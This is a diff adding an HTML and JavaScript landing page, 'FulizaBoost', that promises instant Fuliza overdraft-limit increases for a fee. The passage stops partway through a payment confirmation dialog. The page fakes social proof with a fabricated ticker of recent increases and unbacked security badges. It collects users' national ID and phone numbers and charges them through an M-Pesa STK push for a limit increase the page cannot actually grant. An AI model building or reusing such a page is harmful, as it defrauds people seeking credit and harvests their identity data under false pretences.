@@ -1,0 +1,1583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Boost Your Fuliza Limit | Get Instant Increase</title>
+
+  <!-- Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <!-- SweetAlert2 -->
+  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
+
+  <style>
+    :root {
+      --primary: #1f7a1f;
+      --primary-dark: #00662a;
+      --accent: #d93025;
+      --gradient-bg: linear-gradient(135deg, #f4f6f3 0%, #e9f5ea 100%);
+      --card-bg: #ffffff;
+      --text-dark: #222222;
+      --text-muted: #6b6b6b;
+      --border-color: #dfe7df;
+      --shadow-sm: 0 2px 8px rgba(2, 6, 23, 0.06);
+      --shadow-md: 0 4px 12px rgba(2, 6, 23, 0.08);
+      --shadow-lg: 0 6px 18px rgba(2, 6, 23, 0.12);
+      --radius: 14px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html {
+      font-size: 14px;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--gradient-bg);
+      color: var(--text-dark);
+      line-height: 1.4;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      padding: 12px;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    .container {
+      max-width: 100%;
+      margin: 0 auto;
+    }
+
+    /* Header */
+    .header {
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .logo {
+      font-size: 1.7rem;
+      font-weight: 800;
+      color: var(--primary);
+      margin-bottom: 6px;
+      line-height: 1.2;
+    }
+
+    .logo span {
+      color: var(--accent);
+    }
+
+    .subtitle {
+      color: var(--text-muted);
+      font-size: 0.8rem;
+      margin-bottom: 2px;
+      line-height: 1.3;
+    }
+
+    /* Info Box */
+    .info-box {
+      background: var(--card-bg);
+      border-radius: var(--radius);
+      padding: 14px;
+      margin-bottom: 12px;
+      box-shadow: var(--shadow-sm);
+      border-left: 3px solid var(--primary);
+      text-align: center;
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      line-height: 1.4;
+    }
+
+    .info-box i {
+      color: var(--primary);
+      margin-right: 6px;
+      font-size: 0.9rem;
+    }
+
+    /* Recent Loans Ticker */
+    .recent-loans {
+      background: linear-gradient(90deg, rgba(31, 122, 31, 0.1) 0%, rgba(31, 122, 31, 0.05) 100%);
+      border-radius: var(--radius);
+      padding: 12px;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      box-shadow: var(--shadow-sm);
+      animation: fadeIn 0.5s ease-out;
+    }
+
+    .recent-loans i {
+      color: var(--primary);
+      font-size: 1rem;
+      margin-top: 2px;
+    }
+
+    .recent-content {
+      flex: 1;
+    }
+
+    .recent-loans strong {
+      color: var(--primary);
+      font-weight: 700;
+      font-size: 0.85rem;
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    .recent-loans span {
+      display: block;
+      color: var(--text-dark);
+      font-size: 0.8rem;
+      line-height: 1.3;
+    }
+
+    /* Main Card */
+    .card {
+      background: var(--card-bg);
+      border-radius: var(--radius);
+      padding: 18px;
+      box-shadow: var(--shadow-md);
+      margin-bottom: 16px;
+    }
+
+    /* Progress Bar */
+    .progress {
+      height: 6px;
+      border-radius: 3px;
+      overflow: hidden;
+      display: flex;
+      margin-bottom: 20px;
+      box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+    }
+
+    .progress div {
+      flex: 1;
+      transition: all 0.3s ease;
+    }
+
+    .progress .step-1 { background: #000; }
+    .progress .step-2 { background: var(--accent); }
+    .progress .step-3 { background: var(--primary); }
+
+    /* Title */
+    .title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 18px;
+      line-height: 1.3;
+    }
+
+    .title i {
+      font-size: 1.4rem;
+    }
+
+    /* Loan Grid */
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .loan-box {
+      background: linear-gradient(180deg, #ffffff 0%, #f8f9f7 100%);
+      border: 2px solid var(--border-color);
+      border-radius: 12px;
+      padding: 14px 10px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      user-select: none;
+      min-height: 85px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .loan-box:hover {
+      transform: translateY(-3px);
+      box-shadow: var(--shadow-md);
+      border-color: var(--primary);
+    }
+
+    .loan-box.selected {
+      border-color: var(--primary);
+      background: linear-gradient(180deg, rgba(31, 122, 31, 0.1) 0%, rgba(31, 122, 31, 0.05) 100%);
+      box-shadow: 0 6px 15px rgba(31, 122, 31, 0.15);
+      transform: translateY(-4px) scale(1.01);
+    }
+
+    .amount {
+      font-size: 1.1rem;
+      font-weight: 800;
+      color: var(--primary);
+      margin-bottom: 6px;
+      transition: all 0.3s ease;
+      line-height: 1.2;
+    }
+
+    .loan-box.selected .amount {
+      color: var(--primary-dark);
+      font-size: 1.15rem;
+    }
+
+    .fee {
+      display: inline-block;
+      padding: 4px 10px;
+      background: #eef1ee;
+      border-radius: 999px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      transition: all 0.3s ease;
+      line-height: 1.2;
+    }
+
+    .loan-box.selected .fee {
+      background: var(--primary);
+      color: white;
+    }
+
+    /* CTA Button */
+    .cta {
+      background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+      border-radius: 999px;
+      padding: 16px;
+      text-align: center;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 6px 15px rgba(31, 122, 31, 0.3);
+      border: none;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 8px;
+    }
+
+    .cta:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(31, 122, 31, 0.4);
+    }
+
+    .cta:active {
+      transform: translateY(0);
+      box-shadow: 0 4px 10px rgba(31, 122, 31, 0.3);
+    }
+
+    .cta.disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none !important;
+      box-shadow: none !important;
+    }
+
+    /* Trust Badges */
+    .trust-badges {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 8px;
+      margin-top: 16px;
+      padding: 0 4px;
+    }
+
+    .badge {
+      background: linear-gradient(180deg, rgba(31, 122, 31, 0.05) 0%, rgba(31, 122, 31, 0.02) 100%);
+      border: 1px solid var(--border-color);
+      border-radius: 999px;
+      padding: 8px 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 0.7rem;
+      color: var(--text-muted);
+      text-align: center;
+      line-height: 1.2;
+    }
+
+    .badge i {
+      color: var(--primary);
+      font-size: 0.8rem;
+    }
+
+    /* ID & Phone Input Modal Styles */
+    .input-container {
+      padding: 12px 0;
+      text-align: center;
+    }
+
+    .input-section-title {
+      font-size: 0.9rem;
+      color: var(--text-muted);
+      margin-bottom: 12px;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      line-height: 1.3;
+      padding: 0 4px;
+    }
+
+    .input-wrapper {
+      margin-bottom: 16px;
+    }
+
+    .input-label {
+      display: block;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--primary);
+      margin-bottom: 6px;
+      text-align: left;
+      padding-left: 4px;
+      line-height: 1.2;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 10px 12px;
+      border: 2px solid var(--border-color);
+      border-radius: 10px;
+      font-size: 0.95rem;
+      font-weight: 500;
+      outline: none;
+      background: white;
+      transition: all 0.2s ease;
+    }
+
+    .input-field:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(31, 122, 31, 0.1);
+    }
+
+    .input-field::placeholder {
+      color: #a0a0a0;
+      font-size: 0.9rem;
+    }
+
+    .phone-input-with-prefix {
+      display: flex;
+      width: 100%;
+      border: 2px solid var(--border-color);
+      border-radius: 10px;
+      overflow: hidden;
+      transition: all 0.2s ease;
+    }
+
+    .phone-input-with-prefix:focus-within {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(31, 122, 31, 0.1);
+    }
+
+    .phone-prefix {
+      background: #f8f9f7;
+      padding: 10px 12px;
+      font-weight: 600;
+      color: var(--text-dark);
+      border-right: 2px solid var(--border-color);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 75px;
+      font-size: 0.9rem;
+    }
+
+    .phone-input-field {
+      flex: 1;
+      padding: 10px 12px;
+      border: none;
+      font-size: 0.95rem;
+      font-weight: 500;
+      outline: none;
+      background: white;
+      min-width: 0;
+    }
+
+    .input-note-modal {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      text-align: center;
+      margin-top: 12px;
+      background: #f8f9f7;
+      padding: 10px;
+      border-radius: 8px;
+      line-height: 1.3;
+    }
+
+    /* Animations */
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(15px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes pulse {
+      0% {
+        box-shadow: 0 0 0 0 rgba(31, 122, 31, 0.4);
+      }
+      70% {
+        box-shadow: 0 0 0 8px rgba(31, 122, 31, 0);
+      }
+      100% {
+        box-shadow: 0 0 0 0 rgba(31, 122, 31, 0);
+      }
+    }
+
+    .pulse {
+      animation: pulse 2s infinite;
+    }
+
+    /* Very small phones (320px and below) */
+    @media (max-width: 360px) {
+      html {
+        font-size: 13px;
+      }
+      
+      body {
+        padding: 10px;
+      }
+      
+      .logo {
+        font-size: 1.5rem;
+      }
+      
+      .card {
+        padding: 14px;
+      }
+      
+      .grid {
+        gap: 8px;
+      }
+      
+      .loan-box {
+        padding: 12px 8px;
+        min-height: 78px;
+      }
+      
+      .amount {
+        font-size: 1rem;
+      }
+      
+      .loan-box.selected .amount {
+        font-size: 1.05rem;
+      }
+      
+      .fee {
+        font-size: 0.7rem;
+        padding: 3px 8px;
+      }
+      
+      .title {
+        font-size: 1.1rem;
+        margin-bottom: 16px;
+      }
+      
+      .title i {
+        font-size: 1.3rem;
+      }
+      
+      .cta {
+        padding: 14px;
+        font-size: 0.95rem;
+      }
+      
+      .phone-prefix {
+        min-width: 70px;
+        padding: 8px 10px;
+        font-size: 0.85rem;
+      }
+      
+      .input-field {
+        padding: 8px 10px;
+        font-size: 0.9rem;
+      }
+      
+      .badge {
+        padding: 6px 8px;
+        font-size: 0.65rem;
+      }
+    }
+
+    /* Landscape mode adjustments */
+    @media (max-height: 500px) and (orientation: landscape) {
+      .container {
+        max-width: 100%;
+      }
+      
+      .grid {
+        grid-template-columns: repeat(3, 1fr);
+      }
+      
+      .loan-box {
+        min-height: 70px;
+      }
+    }
+
+    /* Larger phones and tablets */
+    @media (min-width: 480px) {
+      body {
+        padding: 16px;
+      }
+      
+      .container {
+        max-width: 440px;
+      }
+      
+      .logo {
+        font-size: 1.8rem;
+      }
+      
+      .info-box {
+        padding: 16px;
+      }
+      
+      .card {
+        padding: 20px;
+      }
+      
+      .loan-box {
+        padding: 16px 12px;
+        min-height: 90px;
+      }
+      
+      .amount {
+        font-size: 1.15rem;
+      }
+      
+      .phone-prefix {
+        min-width: 80px;
+      }
+    }
+
+    /* SweetAlert Custom - Mobile Optimized */
+    .swal2-popup {
+      border-radius: 16px !important;
+      padding: 20px !important;
+      max-width: 92% !important;
+      width: auto !important;
+      margin: 0 10px !important;
+    }
+
+    .swal2-title {
+      color: var(--primary) !important;
+      font-weight: 700 !important;
+      font-size: 1.15rem !important;
+      margin-bottom: 12px !important;
+      line-height: 1.3 !important;
+      padding: 0 8px !important;
+    }
+
+    .swal2-html-container {
+      margin: 0 !important;
+      padding: 0 !important;
+    }
+
+    .swal2-confirm {
+      background: linear-gradient(90deg, var(--primary), var(--primary-dark)) !important;
+      border-radius: 10px !important;
+      font-weight: 600 !important;
+      padding: 12px 24px !important;
+      font-size: 0.95rem !important;
+      margin-top: 12px !important;
+      width: 100% !important;
+    }
+
+    .swal2-cancel {
+      background: #f8f9f7 !important;
+      border: 2px solid var(--border-color) !important;
+      border-radius: 10px !important;
+      color: var(--text-muted) !important;
+      font-weight: 500 !important;
+      padding: 12px 24px !important;
+      font-size: 0.95rem !important;
+      margin-top: 8px !important;
+      width: 100% !important;
+    }
+
+    .swal2-actions {
+      flex-direction: column !important;
+      width: 100% !important;
+      margin-top: 16px !important;
+    }
+
+    /* Loading spinner adjustments */
+    .swal2-icon {
+      width: 50px !important;
+      height: 50px !important;
+      margin-bottom: 15px !important;
+    }
+
+    .swal2-icon .swal2-icon-content {
+      font-size: 2rem !important;
+    }
+
+    /* Payment confirmation modal specific styles */
+    .payment-confirm-content {
+      padding: 0 5px;
+      text-align: center;
+    }
+
+    .payment-confirm-icon {
+      font-size: 2.5rem !important;
+      color: var(--primary);
+      margin-bottom: 12px;
+    }
+
+    .payment-details-box {
+      background: #f8f9f7;
+      padding: 12px;
+      border-radius: 10px;
+      margin-bottom: 15px;
+    }
+
+    .payment-detail-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      font-size: 0.9rem;
+    }
+
+    .payment-detail-row:last-child {
+      margin-bottom: 0;
+    }
+
+    .payment-phone-note {
+      color: #666;
+      font-size: 0.8rem;
+      margin-top: 10px;
+      line-height: 1.3;
+    }
+
+    /* STK push sent modal */
+    .stk-push-content {
+      text-align: center;
+      padding: 0 5px;
+    }
+
+    .stk-push-icon {
+      font-size: 2.5rem !important;
+      color: var(--primary);
+      margin-bottom: 12px;
+    }
+
+    .stk-phone-display {
+      background: #f8f9f7;
+      padding: 10px;
+      border-radius: 8px;
+      margin: 12px 0;
+      font-weight: 600;
+      font-size: 0.95rem;
+    }
+
+    /* Success modal */
+    .success-icon {
+      font-size: 3rem !important;
+      color: #22c55e;
+      margin-bottom: 12px;
+    }
+
+    /* Error modal */
+    .error-icon {
+      font-size: 2.5rem !important;
+      color: #f59e0b;
+      margin-bottom: 12px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    
+    <!-- Header -->
+    <div class="header">
+      <div class="logo">Fuliza<span>Boost</span></div>
+      <p class="subtitle">Instant Limit Increase • No Paperwork • Same Day Access</p>
+    </div>
+
+    <!-- Info Box -->
+    <div class="info-box">
+      <i class="fas fa-info-circle"></i>
+      Choose your new Fuliza limit and complete the payment to get instant access.
+    </div>
+
+    <!-- Recent Loans -->
+    <div class="recent-loans">
+      <i class="fas fa-bullhorn"></i>
+      <div class="recent-content">
+        <strong>Recent increases</strong>
+        <span id="ticker-text">0725****89 increased to Ksh 18,000 - just now</span>
+      </div>
+    </div>
+
+    <!-- Main Card -->
+    <div class="card" style="animation: fadeIn 0.6s ease-out;">
+      
+      <!-- Progress Bar -->
+      <div class="progress">
+        <div class="step-1"></div>
+        <div class="step-2"></div>
+        <div class="step-3"></div>
+      </div>
+
+      <!-- Title -->
+      <div class="title">
+        <i class="fas fa-wallet"></i>
+        Select Your Fuliza Limit
+      </div>
+
+      <!-- Loan Grid -->
+      <div class="grid" id="loan-grid">
+        <!-- Loan options will be populated by JavaScript -->
+      </div>
+
+      <!-- CTA Button -->
+      <button class="cta disabled" id="get-limit-btn">
+        <i class="fas fa-bolt"></i>
+        Get Limit Now
+      </button>
+
+    </div>
+
+    <!-- Trust Badges -->
+    <div class="trust-badges">
+      <div class="badge">
+        <i class="fas fa-lock"></i>
+        Secure
+      </div>
+      <div class="badge">
+        <i class="fas fa-shield-alt"></i>
+        Encrypted
+      </div>
+      <div class="badge">
+        <i class="fas fa-bolt"></i>
+        Instant
+      </div>
+      <div class="badge">
+        <i class="fas fa-check-circle"></i>
+        Verified
+      </div>
+    </div>
+
+  </div>
+
+  <!-- SweetAlert2 -->
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
+
+  <script>
+    // Configuration - Update these with your serverless function URLs
+    const API_ENDPOINTS = {
+      initiatePayment: '/api/initiate-payment', // Your PayHero endpoint
+      verifyPayment: '/api/verify-payment',
+      normalizePhone: '/api/normalize-phone'
+    };
+
+    // Loan options data
+    const loanOptions = [
+      { amount: 5000, fee: 49 },
+      { amount: 7500, fee: 80 },
+      { amount: 10000, fee: 120 },
+      { amount: 12500, fee: 140 },
+      { amount: 16000, fee: 180 },
+      { amount: 21000, fee: 200 },
+      { amount: 25500, fee: 220 },
+      { amount: 30000, fee: 350 },
+      { amount: 35000, fee: 420 },
+      { amount: 40000, fee: 540 },
+      { amount: 45000, fee: 680 },
+      { amount: 50000, fee: 960 },
+      { amount: 60000, fee: 1550 },
+      { amount: 70000, fee: 2000 }
+    ];
+
+    // State management
+    let selectedLoan = null;
+    let phoneNumber = '';
+    let idNumber = '';
+    let paymentReference = null;
+    let isProcessing = false;
+
+    // DOM Elements
+    const loanGrid = document.getElementById('loan-grid');
+    const getLimitBtn = document.getElementById('get-limit-btn');
+    const tickerText = document.getElementById('ticker-text');
+
+    // Ticker messages
+    const tickerMessages = [
+      "0721****77 increased to Ksh 15,000 - just now",
+      "0723****12 increased to Ksh 9,500 - 2 mins ago",
+      "0710****90 increased to Ksh 4,200 - 1 min ago",
+      "0725****89 increased to Ksh 18,000 - just now",
+      "0722****33 increased to Ksh 5,600 - 3 mins ago",
+      "0728****01 increased to Ksh 21,300 - just now",
+      "0711****45 increased to Ksh 8,000 - 5 mins ago",
+      "0713****12 increased to Ksh 13,200 - 9 mins ago",
+      "0727****01 increased to Ksh 22,500 - 7 mins ago",
+      "0706****78 increased to Ksh 16,400 - just now"
+    ];
+
+    // Initialize the page
+    function initPage() {
+      renderLoanOptions();
+      startTicker();
+      setupEventListeners();
+      restoreFromStorage();
+    }
+
+    // Render loan options grid
+    function renderLoanOptions() {
+      loanGrid.innerHTML = '';
+      
+      loanOptions.forEach((loan, index) => {
+        const loanBox = document.createElement('div');
+        loanBox.className = 'loan-box';
+        loanBox.dataset.index = index;
+        loanBox.dataset.amount = loan.amount;
+        loanBox.dataset.fee = loan.fee;
+        
+        loanBox.innerHTML = `
+          <div class="amount">Ksh ${loan.amount.toLocaleString()}</div>
+          <div class="fee">Fee: Ksh ${loan.fee}</div>
+        `;
+        
+        loanBox.addEventListener('click', () => selectLoan(loanBox, loan));
+        loanGrid.appendChild(loanBox);
+      });
+    }
+
+    // Select a loan option
+    function selectLoan(loanBox, loan) {
+      // Remove selected class from all loan boxes
+      document.querySelectorAll('.loan-box').forEach(box => {
+        box.classList.remove('selected');
+      });
+      
+      // Add selected class to clicked box
+      loanBox.classList.add('selected');
+      
+      // Update selected loan
+      selectedLoan = loan;
+      
+      // Enable button
+      updateButtonState();
+      
+      // Save to storage
+      saveToStorage();
+      
+      // Add pulse animation
+      loanBox.classList.add('pulse');
+      setTimeout(() => loanBox.classList.remove('pulse'), 2000);
+    }
+
+    // Start ticker animation
+    function startTicker() {
+      let index = 0;
+      
+      // Update ticker every 3 seconds
+      setInterval(() => {
+        tickerText.textContent = tickerMessages[index];
+        index = (index + 1) % tickerMessages.length;
+      }, 3000);
+    }
+
+    // Setup event listeners
+    function setupEventListeners() {
+      // Add click listener to the main CTA button
+      getLimitBtn.addEventListener('click', () => {
+        // First show ID and phone input modal, then proceed to payment
+        showIdPhoneModal();
+      });
+    }
+
+    // Phone number normalization function
+    function normalizePhoneInput(phone) {
+      // Remove all non-digits
+      let cleanPhone = phone.replace(/\D/g, '');
+      
+      // Remove leading 0 if present
+      if (cleanPhone.startsWith('0')) {
+        cleanPhone = cleanPhone.substring(1);
+      }
+      
+      // Remove +254 prefix if present
+      if (cleanPhone.startsWith('254')) {
+        cleanPhone = cleanPhone.substring(3);
+      }
+      
+      // Should be exactly 9 digits now
+      if (cleanPhone.length !== 9) {
+        throw new Error('Invalid phone number length');
+      }
+      
+      // Should start with 7 or 1
+      if (!/^[17]/.test(cleanPhone)) {
+        throw new Error('Phone must start with 7 or 1');
+      }
+      
+      return cleanPhone;
+    }
+
+    // Show ID and phone input modal
+    function showIdPhoneModal() {
+      Swal.fire({
+        title: 'Enter Your Details',
+        html: `
+          <div class="input-container">
+            <div class="input-section-title">
+              <i class="fas fa-user-check"></i>
+              Provide your details to proceed
+            </div>
+            
+            <!-- ID Number -->
+            <div class="input-wrapper">
+              <label class="input-label">
+                <i class="fas fa-id-card"></i>
+                ID Number
+              </label>
+              <input 
+                type="text" 
+                class="input-field" 
+                id="swal-id-number"
+                placeholder="Enter your ID number"
+                inputmode="numeric"
+                required
+              >
+            </div>
+            
+            <!-- Phone Number -->
+            <div class="input-wrapper">
+              <label class="input-label">
+                <i class="fas fa-mobile-alt"></i>
+                Phone Number
+              </label>
+              <div class="phone-input-with-prefix">
+                <div class="phone-prefix">+254</div>
+                <input 
+                  type="tel" 
+                  class="phone-input-field" 
+                  id="swal-phone"
+                  placeholder="712 345 678"
+                  maxlength="11"
+                  inputmode="numeric"
+                  required
+                >
+              </div>
+            </div>
+            
+            <div class="input-note-modal">
+              <i class="fas fa-info-circle"></i>
+              We'll send an M-Pesa STK push to your phone number for payment
+            </div>
+          </div>
+        `,
+        icon: 'info',
+        showCancelButton: true,
+        confirmButtonText: 'Continue',
+        cancelButtonText: 'Cancel',
+        focusConfirm: false,
+        allowOutsideClick: false,
+        preConfirm: () => {
+          const idInput = document.getElementById('swal-id-number');
+          const phoneInput = document.getElementById('swal-phone');
+          
+          let idValue = idInput.value.trim();
+          let phoneValue = phoneInput.value;
+          
+          // Validate ID
+          if (!idValue) {
+            Swal.showValidationMessage('Please enter your ID number');
+            return false;
+          }
+          
+          // NEW: Use the normalized phone validation
+          try {
+            phoneValue = normalizePhoneInput(phoneValue);
+          } catch (error) {
+            Swal.showValidationMessage(error.message || 'Invalid phone number format');
+            return false;
+          }
+          
+          return { idNumber: idValue, phone: phoneValue };
+        }
+      }).then((result) => {
+        if (result.isConfirmed && result.value) {
+          idNumber = result.value.idNumber;
+          phoneNumber = result.value.phone;
+          
+          // Save details to storage
+          saveToStorage();
+          
+          // Now proceed with payment flow
+          initiatePayment();
+        }
+      });
+
+      // Add real-time phone formatting
+      setTimeout(() => {
+        const idInput = document.getElementById('swal-id-number');
+        const phoneInput = document.getElementById('swal-phone');
+        
+        // Phone formatting function
+        const formatPhoneInput = (input) => {
+          let value = input.value.replace(/\D/g, '');
+          if (value.length > 3) {
+            value = value.slice(0, 3) + ' ' + value.slice(3);
+          }
+          if (value.length > 7) {
+            value = value.slice(0, 7) + ' ' + value.slice(7);
+          }
+          input.value = value.slice(0, 11);
+        };
+        
+        // Add input listeners for phone
+        if (phoneInput) {
+          phoneInput.addEventListener('input', function(e) {
+            formatPhoneInput(this);
+          });
+          
+          // Focus on the ID input first
+          setTimeout(() => idInput.focus(), 100);
+        }
+        
+        // If we have saved details, prefill them
+        const saved = localStorage.getItem('fulizaBoostData');
+        if (saved) {
+          try {
+            const data = JSON.parse(saved);
+            if (data.idNumber) {
+              idInput.value = data.idNumber;
+            }
+            if (data.phone && data.phone.length === 9) {
+              phoneInput.value = formatPhoneForDisplay(data.phone);
+            }
+          } catch (e) {
+            console.error('Error loading saved details:', e);
+          }
+        }
+      }, 50);
+    }
+
+    // Update button state based on selections
+    function updateButtonState() {
+      const isValid = selectedLoan !== null;
+      
+      getLimitBtn.classList.toggle('disabled', !isValid);
+      getLimitBtn.disabled = !isValid;
+      
+      if (isValid) {
+        getLimitBtn.innerHTML = `<i class="fas fa-bolt"></i> Get Ksh ${selectedLoan.amount.toLocaleString()} Now`;
+      } else {
+        getLimitBtn.innerHTML = `<i class="fas fa-bolt"></i> Get Limit Now`;
+      }
+    }
+
+    // Save to localStorage
+    function saveToStorage() {
+      const data = {
+        selectedLoan: selectedLoan,
+        idNumber: idNumber,
+        phone: phoneNumber,
+        timestamp: Date.now()
+      };
+      
+      localStorage.setItem('fulizaBoostData', JSON.stringify(data));
+    }
+
+    // Restore from localStorage
+    function restoreFromStorage() {
+      const saved = localStorage.getItem('fulizaBoostData');
+      if (saved) {
+        try {
+          const data = JSON.parse(saved);
+          
+          // Restore details
+          if (data.idNumber) {
+            idNumber = data.idNumber;
+          }
+          if (data.phone && data.phone.length === 9) {
+            phoneNumber = data.phone;
+          }
+          
+          // Restore loan selection
+          if (data.selectedLoan) {
+            selectedLoan = data.selectedLoan;
+            const loanBoxes = document.querySelectorAll('.loan-box');
+            loanBoxes.forEach(box => {
+              if (parseInt(box.dataset.amount) === selectedLoan.amount) {
+                box.classList.add('selected');
+              }
+            });
+          }
+          
+          updateButtonState();
+        } catch (e) {
+          console.error('Error restoring from storage:', e);
+        }
+      }
+    }
+
+    // Format phone for display
+    function formatPhoneForDisplay(phone) {
+      if (phone.length !== 9) return phone;
+      return phone.slice(0, 3) + ' ' + phone.slice(3, 6) + ' ' + phone.slice(6);
+    }
+
+    // Format phone for API (with country code)
+    function formatPhoneForAPI(phone) {
+      return '+254' + phone;
+    }
+
+    // Phone number normalization function
+    async function normalizePhoneNumber(phone) {
+      try {
+        // If you have a normalization endpoint
+        if (API_ENDPOINTS.normalizePhone) {
+          const response = await fetch(API_ENDPOINTS.normalizePhone, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: formatPhoneForAPI(phone) })
+          });
+          
+          if (!response.ok) throw new Error('Normalization failed');
+          
+          const data = await response.json();
+          return data.normalized_phone || formatPhoneForAPI(phone);
+        }
+        
+        // Default normalization
+        return formatPhoneForAPI(phone);
+      } catch (error) {
+        console.warn('Phone normalization failed, using default:', error);
+        return formatPhoneForAPI(phone);
+      }
+    }
+
+    // Send PayHero STK push with ID number
+    async function sendPayHeroSTK(phoneNumber, amount, loanAmount, idNumber) {
+      try {
+        const response = await fetch(API_ENDPOINTS.initiatePayment, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            phone_number: phoneNumber,
+            amount: amount,
+            loan_amount: loanAmount,
+            id_number: idNumber,
+            description: `Fuliza Limit Increase: Ksh ${loanAmount.toLocaleString()}`
+          })
+        });
+        
+        if (!response.ok) {
+          const error = await response.json();
+          throw new Error(error.message || 'Payment initiation failed');
+        }
+        
+        const data = await response.json();
+        return data;
+      } catch (error) {
+        console.error('STK push error:', error);
+        throw error;
+      }
+    }
+
+    // Check payment status
+    async function checkPaymentStatus(reference, maxAttempts = 20, intervalMs = 3000) {
+      let attempts = 0;
+      
+      return new Promise((resolve, reject) => {
+        const checkInterval = setInterval(async () => {
+          attempts++;
+          
+          try {
+            const response = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`);
+            
+            if (!response.ok) {
+              if (attempts >= maxAttempts) {
+                clearInterval(checkInterval);
+                reject(new Error('Payment verification failed'));
+              }
+              return;
+            }
+            
+            const data = await response.json();
+            
+            if (data.success && (data.status === 'COMPLETED' || data.status === 'SUCCESS')) {
+              clearInterval(checkInterval);
+              resolve(true);
+            } else if (data.success && (data.status === 'FAILED' || data.status === 'CANCELLED')) {
+              clearInterval(checkInterval);
+              reject(new Error('Payment failed or was cancelled'));
+            } else if (attempts >= maxAttempts) {
+              clearInterval(checkInterval);
+              reject(new Error('Payment verification timeout'));
+            }
+          } catch (error) {
+            console.error('Payment status check error:', error);
+            if (attempts >= maxAttempts) {
+              clearInterval(checkInterval);
+              reject(new Error('Payment verification failed'));
+            }
+          }
+        }, intervalMs);
+      });
+    }
+
+    // Main payment initiation function - MOBILE OPTIMIZED
+    async function initiatePayment() {
+      // Prevent multiple clicks
+      if (isProcessing) return;
+      
+      // Validate inputs
+      if (!phoneNumber || phoneNumber.length !== 9) {
+        Swal.fire({
+          icon: 'error',
+          title: 'Invalid Phone',
+          text: 'Please enter a valid 9-digit phone number',
+          confirmButtonColor: '#1f7a1f',
+          customClass: {
+            popup: 'swal2-popup-mobile'
+          }
+        });
+        return;
+      }
+      
+      if (!idNumber || idNumber.trim() === '') {
+        Swal.fire({
+          icon: 'error',
+          title: 'ID Required',
+          text: 'Please enter your ID number',
+          confirmButtonColor: '#1f7a1f',
+          customClass: {
+            popup: 'swal2-popup-mobile'
+          }
+        });
+        return;
+      }
+      
+      if (!selectedLoan) {
+        Swal.fire({
+          icon: 'error',
+          title: 'No Loan Selected',
+          text: 'Please select a loan amount',
+          confirmButtonColor: '#1f7a1f',
+          customClass: {
+            popup: 'swal2-popup-mobile'
+          }
+        });
+        return;
+      }
+      
+      // Validate phone format
+      if (!/^[17]/.test(phoneNumber)) {
+        Swal.fire({
+          icon: 'error',
+          title: 'Invalid Phone Format',
+          text: 'Phone number must start with 7 or 1',
+          confirmButtonColor: '#1f7a1f',
+          customClass: {
+            popup: 'swal2-popup-mobile'
+          }
+        });
+        return;
+      }
+      
+      isProcessing = true;
+      getLimitBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
+      getLimitBtn.disabled = true;
+      
+      try {
+        // Show confirmation dialog - MOBILE OPTIMIZED
+        const confirmed = await Swal.fire({
+          title: 'Confirm Limit Increase',
+          html: `
+            <div class="payment-confirm-content">
+              <div class="payment-confirm-icon">
